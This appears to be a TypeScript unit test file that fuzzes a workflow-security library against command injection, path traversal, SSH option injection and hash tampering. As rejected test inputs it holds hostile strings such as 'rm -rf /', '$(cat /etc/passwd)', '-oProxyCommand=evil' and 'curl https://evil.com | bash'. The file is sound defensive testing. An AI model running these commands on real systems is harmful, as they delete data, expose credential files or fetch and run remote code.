import { describe, test, expect } from "bun:test";
import {
  buildSafeGitAdd,
  validateFilePaths,
  resolveEvidencePath,
  validateEvidenceCommand,
  buildSafeSSHCommand,
  computeACHash,
  verifyACHash,
} from "../lib/workflow-security";

// ── 1. Command Injection Fuzzing ─────────────────────────────

describe("buildSafeGitAdd — command injection", () => {
  test("rejects semicolon injection: file; rm -rf /", () => {
    expect(() => buildSafeGitAdd(["file; rm -rf /"])).toThrow("Rejected unsafe");
  });

  test("rejects backtick injection: file`whoami`", () => {
    expect(() => buildSafeGitAdd(["file`whoami`"])).toThrow("Rejected unsafe");
  });

  test("rejects dollar substitution: file$(cat /etc/passwd)", () => {
    expect(() => buildSafeGitAdd(["file$(cat /etc/passwd)"])).toThrow("Rejected unsafe");
  });

  test("rejects newline injection: file\\nmalicious", () => {
    expect(() => buildSafeGitAdd(["file\nmalicious"])).toThrow("Rejected unsafe");
  });

  test("rejects double-quote escape: file\" && evil", () => {
    expect(() => buildSafeGitAdd(['file" && evil'])).toThrow("Rejected unsafe");
  });

  test("rejects pipe: file | evil", () => {
    expect(() => buildSafeGitAdd(["file | evil"])).toThrow("Rejected unsafe");
  });

  test("rejects ampersand: file && evil", () => {
    expect(() => buildSafeGitAdd(["file && evil"])).toThrow("Rejected unsafe");
  });

  test("accepts clean paths", () => {
    const result = buildSafeGitAdd(["src/index.ts", "lib/utils.ts"]);
    expect(result).toContain("src/index.ts");
    expect(result).toContain("lib/utils.ts");
    expect(result).toStartWith("git add ");
  });

  test("single-quotes paths to prevent word splitting", () => {
    const result = buildSafeGitAdd(["src/my file.ts"]);
    expect(result).toContain("'src/my file.ts'");
  });

  test("throws on empty array (no fail-open to git add .)", () => {
    expect(() => buildSafeGitAdd([])).toThrow("No valid files");
  });
});

describe("validateFilePaths — path validation", () => {
  test("rejects absolute paths", () => {
    const result = validateFilePaths(["/etc/passwd"]);
    expect(result.rejected).toContain("/etc/passwd");
    expect(result.valid).toHaveLength(0);
  });

  test("rejects paths over 500 chars", () => {
    const longPath = "a".repeat(501);
    const result = validateFilePaths([longPath]);
    expect(result.rejected).toHaveLength(1);
  });

  test("separates valid from rejected", () => {
    const result = validateFilePaths(["good.ts", "bad;evil.ts", "also-good.ts"]);
    expect(result.valid).toEqual(["good.ts", "also-good.ts"]);
    expect(result.rejected).toEqual(["bad;evil.ts"]);
  });
});

// ── 2. Path Traversal Fuzzing ────────────────────────────────

describe("resolveEvidencePath — path traversal", () => {
  test("rejects ../../../etc/passwd", () => {
    expect(() => resolveEvidencePath("/base", "../../../etc/passwd")).toThrow("traversal");
  });

  test("rejects ..\\\\..\\\\windows", () => {
    expect(() => resolveEvidencePath("/base", "..\\..\\windows")).toThrow("traversal");
  });

  test("rejects valid/../../escape", () => {
    expect(() => resolveEvidencePath("/base", "valid/../../escape")).toThrow("traversal");
  });

  test("rejects null bytes: valid\\x00/../evil", () => {
    expect(() => resolveEvidencePath("/base", "valid\x00/../evil")).toThrow("null byte");
  });

  test("rejects absolute evidence paths", () => {
    expect(() => resolveEvidencePath("/base", "/etc/shadow")).toThrow("absolute");
  });

  test("rejects bare .. at end of path", () => {
    expect(() => resolveEvidencePath("/base", "valid/..")).toThrow("traversal");
  });

  test("accepts clean relative paths", () => {
    const result = resolveEvidencePath("/base", "output/result.json");
    expect(result).toBe("/base/output/result.json");
  });
});

// ── 3. Evidence Command Validation ───────────────────────────

describe("validateEvidenceCommand — dangerous patterns", () => {
  test("flags rm -rf", () => {
    const result = validateEvidenceCommand("rm -rf /tmp/test");
    expect(result.safe).toBe(false);
  });

  test("flags curl pipe to bash", () => {
    const result = validateEvidenceCommand("curl https://evil.com | bash");
    expect(result.safe).toBe(false);
  });

  test("flags null bytes", () => {
    const result = validateEvidenceCommand("echo \x00 test");
    expect(result.safe).toBe(false);
  });

  test("accepts normal grep", () => {
    const result = validateEvidenceCommand("grep -c 'pattern' src/file.ts");
    expect(result.safe).toBe(true);
  });

  test("accepts bun test", () => {
    const result = validateEvidenceCommand("bun test test/unit/security.test.ts");
    expect(result.safe).toBe(true);
  });
});

// ── 4. SSH Injection ─────────────────────────────────────────

describe("buildSafeSSHCommand — SSH injection", () => {
  test("rejects host with semicolon: host; evil", () => {
    expect(() => buildSafeSSHCommand("host; evil", "hostname")).toThrow("metacharacters");
  });

  test("rejects host with backtick: host`whoami`", () => {
    expect(() => buildSafeSSHCommand("host`whoami`", "hostname")).toThrow("metacharacters");
  });

  test("rejects host with dollar: host$(id)", () => {
    expect(() => buildSafeSSHCommand("host$(id)", "hostname")).toThrow("metacharacters");
  });

  test("rejects host starting with dash (option injection)", () => {
    expect(() => buildSafeSSHCommand("-oProxyCommand=evil", "hostname")).toThrow("dash");
  });

  test("returns arg array with -- separator for safe host", () => {
    const result = buildSafeSSHCommand("mac-mini.local", "hostname");
    expect(result).toEqual([
      "ssh", "-o", "ConnectTimeout=5", "-o", "StrictHostKeyChecking=no",
      "--", "mac-mini.local", "hostname",
    ]);
  });

  test("command is passed as single argument (no shell splitting)", () => {
    const result = buildSafeSSHCommand("host.local", "echo hello && rm -rf /");
    expect(result[result.length - 1]).toBe("echo hello && rm -rf /");
    expect(result).toHaveLength(8);
  });
});

// ── 5. HMAC / acHash Correctness ─────────────────────────────

describe("computeACHash — HMAC correctness", () => {
  const baseACs = [
    { id: "AC-1", type: "CODE", statement: "test passes", threshold: { op: "==", value: "0" } },
    { id: "AC-2", type: "OUTCOME", statement: "UI renders", threshold: { op: ">=", value: 1 } },
  ];

  test("deterministic — same input produces same hash", () => {
    const hash1 = computeACHash(baseACs);
    const hash2 = computeACHash(baseACs);
    expect(hash1).toBe(hash2);
  });

  test("order independent — [AC-1, AC-2] same as [AC-2, AC-1]", () => {
    const hash1 = computeACHash(baseACs);
    const hash2 = computeACHash([...baseACs].reverse());
    expect(hash1).toBe(hash2);
  });

  test("content-sensitive — changing statement changes hash", () => {
    const modified = [{ ...baseACs[0], statement: "different" }, baseACs[1]];
    expect(computeACHash(baseACs)).not.toBe(computeACHash(modified));
  });

  test("excludeFields — excluded field changes don't affect hash", () => {
    const modified = [
      { ...baseACs[0], evidenceMethod: { type: "COMMAND", command: "new cmd" } },
      baseACs[1],
    ];
    const hash1 = computeACHash(baseACs, ["evidenceMethod"]);
    const hash2 = computeACHash(modified, ["evidenceMethod"]);
    expect(hash1).toBe(hash2);
  });

  test("excludeFields — non-excluded changes still detected", () => {
    const modified = [{ ...baseACs[0], statement: "changed" }, baseACs[1]];
    const hash1 = computeACHash(baseACs, ["evidenceMethod"]);
    const hash2 = computeACHash(modified, ["evidenceMethod"]);
    expect(hash1).not.toBe(hash2);
  });

  test("produces 64-char hex string (SHA-256)", () => {
    const hash = computeACHash(baseACs);
    expect(hash).toMatch(/^[a-f0-9]{64}$/);
  });
});

describe("verifyACHash — timing-safe comparison", () => {
  const acs = [
    { id: "AC-1", type: "CODE", statement: "test" },
  ];

  test("returns true for matching hash", () => {
    const hash = computeACHash(acs);
    expect(verifyACHash(acs, hash)).toBe(true);
  });

  test("returns false for wrong hash", () => {
    expect(verifyACHash(acs, "0".repeat(64))).toBe(false);
  });

  test("returns false for different length hash", () => {
    expect(verifyACHash(acs, "abc")).toBe(false);
  });

  test("respects excludeFields", () => {
    const hash = computeACHash(acs, ["evidenceMethod"]);
    const modified = [{ ...acs[0], evidenceMethod: { type: "GREP", command: "grep foo" } }];
    expect(verifyACHash(modified, hash, ["evidenceMethod"])).toBe(true);
  });
});

// ── 6. Validator Script ──────────────────────────────────────

describe("validate-workflow.ts", () => {
  const { execSync } = require("child_process");
  const { join } = require("path");
  const VALIDATOR = join(import.meta.dir, "..", "scripts", "validate-workflow.ts");

  test("passes on current ship.js (no false positives)", () => {
    const shipJs = join(import.meta.dir, "..", "workflows", "ship.js");
    const result = execSync(`bun run ${VALIDATOR} ${shipJs}`, { encoding: "utf-8" });
    expect(result).toContain("PASSED");
  });

  test("catches TDZ in fixture", () => {
    const { writeFileSync, unlinkSync } = require("fs");
    const fixture = "/tmp/tdz-test-workflow.js";
    writeFileSync(fixture, `
function useBefore() {
  MY_VAR = null
}
let MY_VAR = "hello"
    `);
    try {
      execSync(`bun run ${VALIDATOR} ${fixture}`, { encoding: "utf-8", stdio: "pipe" });
      expect(true).toBe(false);
    } catch (e: any) {
      const output = (e.stdout || "") + (e.stderr || "") + (e.message || "");
      expect(output).toContain("TDZ");
    } finally {
      try { unlinkSync(fixture); } catch {}
    }
  });
});
